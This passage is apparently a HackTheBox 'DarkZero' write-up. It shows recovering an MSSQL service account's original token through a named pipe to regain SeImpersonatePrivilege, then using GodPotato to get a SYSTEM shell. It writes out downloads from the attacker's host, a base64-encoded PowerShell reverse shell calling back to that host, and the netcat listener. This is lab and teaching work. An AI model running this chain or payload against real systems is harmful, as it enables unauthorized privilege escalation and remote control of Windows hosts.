# SeImpersonatePrivilege Token Theft

### via Token Theft

#### Strategy

I’m going to do the same technique I showed in the [HTB: Signed](https://0xdf.gitlab.io/2026/02/07/htb-signed.html#via-seimpersonate-restoration)
 post. When the MSSQL service starts at boot, Windows authenticates the 
mssqlsvc account and creates a logon session. LSASS stores this initial 
token for use during network authentication. Service accounts are 
granted `SeImpersonatePrivilege`
 by default, and MSSQL legitimately uses impersonation to handle client 
connections under different security contexts. So it’s reasonable to 
assume the original token has this privilege. As I show [above](https://0xdf.gitlab.io/2026/04/04/htb-darkzero.html#enumeration), the shell as svc_sql doesn’t have `SeImpersonatePrivilege`, which means the service must be running with a restricted token as a hardening measure.

A post from Tyranid’s Lair titled [Sharing a Logon Session a Little Too Much](https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html)
 from 2020 goes into detail on how to recover this original token by 
creating a named pipe. On connecting to the pipe, the SMB redirector 
(running in the kernel) performs authentication using the stored token 
rather than the current process. Impersonating the pipe client yields 
the original token.

#### Build and Upload Module

I’ll build the module using the same steps I showed in Signed, using Linux PowerShell:

```powershell
oxdf@hacky$pwsh
PowerShell 7.5.4PS >Install-Module -Name PSWSMan
Untrusted repository
You are installing the modules from an untrusted repository. If you trust this repository, change its InstallationPolicy value by running the Set-PSRepository cmdlet. Are you sure you want
to install the modules from 'PSGallery'?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): APS >Install-Module -Name NtObjectManager
Untrusted repository
You are installing the modules from an untrusted repository. If you trust this repository, change its InstallationPolicy value by running the Set-PSRepository cmdlet. Are you sure you want
to install the modules from 'PSGallery'?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): APS >Save-Module -Name NtObjectManager -Path /home/oxdf/
PS >Compress-Archive -Path /home/oxdf/NtObjectManager/* -DestinationPath ./NtObjectManager.zip
```

I’ll host that zip archive with a Python webserver, upload it to DarkZero, unpack it, and import it:

```powershell
PS C:\programdata>wgethttp://10.10.14.61/NtObjectManager.zip-outfileNtObjectManager.zipPS C:\programdata>expand-archiveNtObjectManager.zip-destinationpath.PS C:\programdata>cd2.0.1PS C:\programdata\2.0.1>ls
    Directory: C:\programdata\2.0.1

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/11/2026  12:30 PM                en-US
-a----        11/15/2023   4:07 PM          66048 Be.Windows.Forms.HexBox.dll
-a----        11/15/2023   4:07 PM        3607552 EditSection.exe
-a----         11/8/2023   8:45 PM         199423 Formatters.ps1xml
-a----          1/7/2011   5:24 AM          22016 NDesk.Options.dll
-a----        11/15/2023   4:09 PM        3873280 NtObjectManager.dll
-a----        11/15/2023   4:09 PM        5894552 NtObjectManager.dll-Help.xml
-a----        11/15/2023   4:08 PM          19058 NtObjectManager.psd1
-a----        11/15/2023   4:09 PM         656277 NtObjectManager.psm1
-a----         3/11/2026  12:27 PM          89028 PSGetModuleInfo.xml
-a----        11/15/2023   4:07 PM        3806208 TokenViewer.exe
-a----        12/16/2022   5:22 PM            435 TypeExtensions.ps1xml
-a----        11/15/2023   4:07 PM        3569664 ViewSecurityDescriptor.exe
-a----        10/24/2018   8:52 AM         316392 WeifenLuo.WinFormsUI.Docking.dllPS C:\programdata\2.0.1>import-module.\NtObjectManager.psm1
```

#### Get Token

I’ll get a copy of the original token that is likely to have the `SeImpersonatePrivilege`:

```powershell
PS C:\programdata\2.0.1>$pipe=New-NtNamedPipeFile\\.\pipe\oxdf-Win32PathPS C:\programdata\2.0.1>$job=Start-Job{$pipe.Listen()}PS C:\programdata\2.0.1>$job
Id     Name            PSJobTypeName   State         HasMoreData     Location             Command
--     ----            -------------   -----         -----------     --------             -------
5      Job5            BackgroundJob   Running       True            localhost             $pipe.Listen()PS C:\programdata\2.0.1>$file=Get-NtFile\\localhost\pipe\oxdf-Win32PathPS C:\programdata\2.0.1>$token=Use-NtObject($pipe.Impersonate()){Get-NtToken-Impersonation}PS C:\programdata\2.0.1>$token
User                            : darkzero-ext\svc_sql
Groups                          : {darkzero-ext\Domain Users, Everyone, BUILTIN\Users, BUILTIN\Pre-Windows 2000
                                  Compatible Access...}
EnabledGroups                   : {darkzero-ext\Domain Users, Everyone, BUILTIN\Users, BUILTIN\Pre-Windows 2000
                                  Compatible Access...}
DenyOnlyGroups                  : {}
GroupCount                      : 14
AuthenticationId                : 00000000-00029ABB
TokenType                       : Impersonation
ExpirationTime                  : 9223372036854775807
Id                              : 00000000-0047030D
ModifiedId                      : 00000000-004702E5
Owner                           : S-1-5-21-1969715525-31638512-2552845157-1103
PrimaryGroup                    : S-1-5-21-1969715525-31638512-2552845157-513
DefaultDacl                     : {Type Allowed - Flags None - Mask 10000000 - Sid
                                  S-1-5-21-1969715525-31638512-2552845157-1103, Type Allowed - Flags None - Mask
                                  10000000 - Sid S-1-5-18, Type Allowed - Flags None - Mask A0000000 - Sid
                                  S-1-5-5-0-170663}
Source                          : Identifier = 00000000-00029AA8 - Name = Advapi
RestrictedSids                  : {}
RestrictedSidsCount             : 0
ImpersonationLevel              : Impersonation
SessionId                       : 0
SandboxInert                    : False
Origin                          : 00000000-000003E7
ElevationType                   : Default
Elevated                        : True
HasRestrictions                 : False
UIAccess                        : False
VirtualizationAllowed           : False
VirtualizationEnabled           : False
Restricted                      : False
WriteRestricted                 : False
Filtered                        : False
NotLow                          : True
Flags                           : NotLow
NoChildProcess                  : False
Capabilities                    : {}
MandatoryPolicy                 : NoWriteUp, NewProcessMin
LogonSid                        : NT AUTHORITY\LogonSessionId_0_170663
IntegrityLevelSid               : Mandatory Label\High Mandatory Level
AppContainerNumber              : 0
IntegrityLevel                  : High
SecurityAttributes              : {}
DeviceClaimAttributes           : {}
UserClaimAttributes             : {}
RestrictedUserClaimAttributes   :
RestrictedDeviceClaimAttributes :
AppContainer                    : False
LowPrivilegeAppContainer        : False
AppContainerSid                 :
DeviceGroups                    : {}
RestrictedDeviceGroups          :
Privileges                      : {SeAssignPrimaryTokenPrivilege, SeIncreaseQuotaPrivilege, SeMachineAccountPrivilege,
                                  SeChangeNotifyPrivilege...}
FullPath                        : darkzero-ext\svc_sql - 00000000-00029ABB
TrustLevel                      :
IsPseudoToken                   : False
IsSandbox                       : False
PackageFullName                 :
AppId                           :
AppModelPolicyDictionary        : {}
BnoIsolationPrefix              :
PackageIdentity                 :
AuditPolicy                     :
PrivateNamespace                : False
ProcessUniqueAttribute          :
GrantedAccess                   : AssignPrimary, Duplicate, Impersonate, Query, QuerySource, AdjustPrivileges,
                                  AdjustGroups, AdjustDefault, AdjustSessionId, Delete, ReadControl, WriteDac,
                                  WriteOwner
GrantedAccessGeneric            : GenericAll
GrantedAccessMask               : 983551
SecurityDescriptor              : O:S-1-5-21-1969715525-31638512-2552845157-1103G:DUD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;
                                  S-1-5-21-1969715525-31638512-2552845157-1103)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-2
                                  1-1969715525-31638512-2552845157-1103)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCS
                                  WRPWPDTLOCRSDRCWDWO;;;SY)S:AI(ML;;NW;;;HI)
Sddl                            : O:S-1-5-21-1969715525-31638512-2552845157-1103G:DUD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;
                                  S-1-5-21-1969715525-31638512-2552845157-1103)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-2
                                  1-1969715525-31638512-2552845157-1103)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCS
                                  WRPWPDTLOCRSDRCWDWO;;;SY)S:AI(ML;;NW;;;HI)
Handle                          : 0xA54
NtTypeName                      : Token
NtType                          : Name = Token - Index = 5
Name                            : svc_sql - 00000000-00029ABB
CanSynchronize                  : False
CreationTime                    : 1/1/1601 12:00:00 AM
AttributesFlags                 : None
HandleReferenceCount            : 1
PointerReferenceCount           : 32694
Inherit                         : False
ProtectFromClose                : False
Address                         : 0
IsContainer                     : False
IsClosed                        : False
ObjectName                      : darkzero-ext\svc_sql - 00000000-00029ABB
```

That dumps a lot of information about the token that isn’t really important. What does matter is that the token has `SeImpersonatePrivilege`:

```powershell
PS C:\programdata\2.0.1>$token.privileges|ftName,Attributes,DisplayName
Name                                         Attributes DisplayName
----                                         ---------- -----------
SeAssignPrimaryTokenPrivilege                   Enabled Replace a process level token
SeIncreaseQuotaPrivilege                        Enabled Adjust memory quotas for a process
SeMachineAccountPrivilege                       Enabled Add workstations to domain
SeChangeNotifyPrivilege       EnabledByDefault, Enabled Bypass traverse checking
SeImpersonatePrivilege        EnabledByDefault, Enabled Impersonate a client after authentication
SeCreateGlobalPrivilege       EnabledByDefault, Enabled Create global objects
SeIncreaseWorkingSetPrivilege                   Enabled Increase a process working set
```

I can verify that by starting a new process using the token:

```powershell
PS C:\>New-Win32Process-Commandline'cmd.exe /c whoami /priv 2>&1 > /programdata/output.txt'-token$token
Process            : cmd.exe
Thread             : thread:2404 - process:1844
Pid                : 1844
Tid                : 2404
TerminateOnDispose : False
ExitStatus         : 0
ExitNtStatus       : STATUS_SUCCESSPS C:\>catprogramdata\output.txt
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token             Enabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Enabled
SeMachineAccountPrivilege     Add workstations to domain                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
```

#### God Potato

I’ll grab a copy of [GodPotato](https://github.com/BeichenDream/GodPotato) from the release page and upload it to DarkZero, along with a reverse shell from [revshells.com](https://www.revshells.com/):

```powershell
PS C:\programdata>wget10.10.14.61/GodPotato-NET4.exe-outfilegp.exePS C:\programdata>wget10.10.14.61/shell.ps1-outfileshell.ps1PS C:\programdata>catshell.ps1powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAxACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
```

I’ve found that having the reverse shell in a `.ps1` file makes running GodPotato more reliable. I’ll run it using the token to create the process:

```powershell
PS C:\>New-Win32Process-Commandline'C:\programdata\gp.exe -cmd "powershell C:\programdata\shell.ps1 2>&1"'-token$token
Process            : gp.exe
Thread             : thread:3264 - process:2760
Pid                : 2760
Tid                : 3264
TerminateOnDispose : False
ExitStatus         : 259
ExitNtStatus       : STATUS_PENDING
```

At my `nc` (after a few seconds):

```powershell
oxdf@hacky$rlwrap -cAr nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.129.5.34 62831PS C:\Windows\system32>whoami
nt authority\system
```

And I can read `user.txt`:

```powershell
PS C:\users\administrator\desktop>catuser.txt9f4d14a2************************
```